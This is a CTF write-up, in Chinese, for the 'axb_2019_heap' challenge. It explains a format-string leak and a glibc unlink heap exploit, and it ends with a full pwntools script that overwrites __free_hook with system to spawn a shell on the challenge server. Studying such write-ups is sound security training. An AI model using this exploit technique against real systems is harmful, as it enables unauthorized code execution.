# 漏洞成因
## 程序关键结构体
程序使用一个全局数组`note`来管理堆块，每个元素包含一个指向堆块的指针和该堆块的大小。在内存中，每个元素占16字节：8字节指针、4字节大小、4字节填充（用于对齐）。
```c
struct note_entry {
    void *ptr;   // 指向分配的堆块
    size_t size; // 堆块的大小（实际存储为int类型）
    char padding[4]; // 填充字节
};
```

## 漏洞定位
1. **格式化字符串漏洞**：在`banner`函数中，用户输入的字符串直接作为`printf`的格式字符串，导致栈数据泄露。
   ```c
   void banner() {
       char format[12];
       // ...
       printf(format); // 直接使用用户输入作为格式字符串
   }
   ```
2. **堆管理漏洞**：程序在`delete_note`函数中释放堆块后将指针置零，但通过构造fake chunk触发unlink可以修改`note`数组中的指针，从而绕过`check_pass`检查（该检查确保指针指向堆区域），实现任意地址写。
   ```c
   void delete_note() {
       free(*((void **)&note + 2 * idx)); // 释放堆块
       *((_QWORD *)&note + 2 * idx) = 0; // 指针置零
       // ...
   }
   ```

# 漏洞利用过程：
利用格式化字符串泄露libc基地址和程序基地址，计算出`note`数组地址。然后通过堆布局构造fake chunk，触发unlink修改`note`数组，将`__free_hook`改为`system`地址，最后通过释放一个包含`"/bin/sh"`的堆块来获取shell。

## Step1~2: 泄露地址并计算关键地址
- 通过格式化字符串泄露`__libc_start_main+240`和`main`函数的地址。偏移分别为15和19（基于栈布局计算）。
- 计算libc基地址：`leak - 240 - libc.symbols["__libc_start_main"]`。
- 计算`note`数组地址：`main_addr - 0x116a + 0x202060`（其中`0x116a`是`main`函数相对于程序基地址的偏移，`0x202060`是`note`数组在bss段的偏移）。
- 无直接内存变化，但获取了后续利用所需的关键地址。

## Step3: 堆布局
- 创建两个堆块：chunk0（大小0x98）和chunk1（大小0x90）。
- 内存变化：
  - 堆上分配了两个chunk，地址分别为`chunk0_ptr`和`chunk1_ptr`。
  - bss段`note`数组（地址`ptr`）被初始化：`note[0].ptr = chunk0_ptr`，`note[0].size = 0x98`；`note[1].ptr = chunk1_ptr`，`note[1].size = 0x90`。

## Step4: 构造fake chunk
- 编辑chunk0，写入伪造的chunk数据，包括fake chunk头部和指向`note`数组的fd/bk指针。
- 内存变化：
  - 堆内存`chunk0_ptr`处，内容被修改为：
    - `p64(0) + p64(0x91)`：fake chunk的prev_size和size（size的PREV_INUSE位为1，表示前一个chunk在使用中）。
    - `p64(ptr - 0x18) + p64(ptr - 0x10)`：fd和bk指针，指向`note`数组附近，用于unlink。
    - `p64(0)*14`：填充数据。
    - `p64(0x90) + b"\xa0"`：设置下一个chunk（chunk1）的prev_size为0x90，并将size的最低字节改为0xa0（清除PREV_INUSE位，使系统认为前一个chunk是空闲的）。
  - bss段`note`数组内容不变，仍记录chunk0和chunk1的指针。

## Step5: 触发unlink
- 删除chunk1，由于chunk1的prev_inuse位为0，系统会尝试合并前一个chunk（即fake chunk），触发unlink操作，修改fake chunk的fd和bk指针指向的内容。
- 内存变化：
  - 堆内存`chunk1_ptr - 0x10`（即chunk1的头部）处，此前的内容是`0x91`（size），现在变为`0xa0`（size），同时prev_size被设置为0x90。
  - bss段`note`数组（地址`ptr`）处，此前`note[0].ptr`指向chunk0，现在被修改为`ptr - 0x18`；`note[1].ptr`被清零（因为delete函数会置零指针）。

## Step6: 修改note数组
- 编辑chunk0，此时`note[0].ptr`为`ptr - 0x18`，写入数据会覆盖`note`数组。
- 内存变化：
  - bss段`note`数组（地址`ptr`）处，此前`note[0].ptr`为`ptr - 0x18`，现在被修改为`free_hook`地址，`note[0].size`被改为0x48；`note[1].ptr`被修改为`ptr + 0x18`（指向后续写入的`"/bin/sh"`字符串），并在`ptr + 0x18`处写入字符串`"/bin/sh\x00"`。

## Step7: 写入system地址到__free_hook
- 编辑chunk0，此时`note[0].ptr`为`free_hook`地址，因此写入`system`地址会修改`__free_hook`的值。
- 内存变化：
  - libc中的`__free_hook`地址处，此前内容可能是0或某个函数指针，现在被修改为`system`函数地址。

## Step8: 触发shell
- 删除chunk1，此时`note[1].ptr`指向`"/bin/sh"`字符串，调用`free`时会执行`__free_hook`，即`system("/bin/sh")`，从而获取shell。
- 无显著内存变化，但控制流被劫持，启动shell。

# Exploit：
```python
from pwn import *

# 设置运行环境和上下文
r = remote("node4.buuoj.cn", 25952)  # 远程连接
context.log_level = 'debug'
elf = ELF('axb_2019_heap')
libc = ELF('./libc-2.23.so')

# 定义功能函数
def add(idx, size, content):
    r.sendlineafter(">> ", "1")
    r.recvuntil("(0-10):")
    r.sendline(str(idx))
    r.recvuntil("Enter a size:\n")
    r.sendline(str(size))
    r.recvuntil("Enter the content: \n")
    r.sendline(content)

def edit(idx, content):
    r.sendlineafter(">> ", "4")
    r.recvuntil("Enter an index:\n")
    r.sendline(str(idx))
    r.recvuntil("Enter the content: \n")
    r.sendline(content)

def delete(idx):
    r.sendlineafter(">> ", "2")
    r.recvuntil("Enter an index:\n")
    r.sendline(str(idx))

# Step1: 通过格式化字符串泄露地址
r.recvuntil("Enter your name: ")
r.sendline('%15$p%19$p')  # 泄露__libc_start_main+240和main地址
r.recvuntil('Hello, ')
leak = int(r.recv(14), 16) - 240  # 获取__libc_start_main地址
base = leak - libc.symbols["__libc_start_main"]  # 计算libc基地址
sys = base + libc.symbols["system"]  # 计算system地址
free_hook = base + libc.symbols["__free_hook"]  # 计算__free_hook地址
print('leak:' + hex(leak))
print('sys:' + hex(sys))
leak1 = int(r.recv(15), 16)  # 获取main函数地址
ptr = leak1 - 0x116a + 0x202060  # 计算note数组地址（bss段）
print('leak1' + hex(leak1))
print('bss_ptr:' + hex(ptr))

# Step2: 堆布局
add(0, 0x98, 'a' * 8)  # 创建chunk0，用于构造fake chunk
add(1, 0x90, 'b' * 8)  # 创建chunk1，用于触发unlink

# Step3: 构造fake chunk并触发unlink
payload = p64(0) + p64(0x91) + p64(ptr - 0x18) + p64(ptr - 0x10)  # fake chunk头部
payload += p64(0) * 14 + p64(0x90) + b"\xa0"  # 设置下一个chunk的prev_size和size（清除PREV_INUSE位）
edit(0, payload)  # 将伪造数据写入chunk0
delete(1)  # 触发unlink，修改note[0].ptr为ptr-0x18

# Step4: 修改note数组，将free_hook和/bin/sh写入
payload = p64(0) * 3 + p64(free_hook) + p64(0x48)  # 覆盖note[0].ptr为free_hook，size为0x48
payload += p64(ptr + 0x18) + b"/bin/sh\x00"  # 覆盖note[1].ptr为ptr+0x18，并写入/bin/sh字符串
edit(0, payload)  # 写入数据，此时note[0].ptr指向free_hook

# Step5: 将system地址写入__free_hook
payload = p64(sys)
edit(0, payload)  # 修改__free_hook为system地址

# Step6: 触发shell
delete(1)  # 释放note[1].ptr（指向/bin/sh），实际调用system("/bin/sh")
r.interactive()  # 进入交互模式
```
